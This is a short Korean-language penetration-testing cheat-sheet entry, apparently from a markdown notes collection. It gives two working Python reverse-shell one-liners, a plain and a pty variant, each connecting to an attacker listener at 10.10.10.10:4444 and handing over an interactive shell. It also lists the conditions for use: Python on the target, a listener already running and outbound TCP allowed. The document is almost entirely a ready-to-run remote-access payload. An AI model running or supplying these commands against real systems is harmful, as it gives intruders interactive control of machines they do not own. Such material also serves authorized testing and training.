# linux python reverse shell

> 무엇: python socket으로 리스너에 연결해 os.dup2로 표준 입출력을 소켓에 물리는 리버스 셸 원라이너(pty 버전은 연결 직후부터 TTY가 붙는다)
> 언제: 타깃에 python이 설치돼 있을 때 가장 무난한 선택이고, pty 버전을 쓰면 별도 TTY 안정화 단계를 건너뛴다
> 조건: 타깃에 python2·python3 중 하나 존재, 공격자 리스너 사전 실행, 타깃에서 공격자로 TCP 아웃바운드 허용 필요

python이 있을 때. pty 버전은 연결 직후부터 TTY가 붙어 별도 안정화 단계가 필요 없다.

```bash
# 일반
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# pty — 권장
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

- python3가 없으면 `python2`로도 동일하게 동작한다.
- TTY 안정화가 필요하면 → [../shell-upgrade/python_pty.md](../shell-upgrade/python_pty.md)
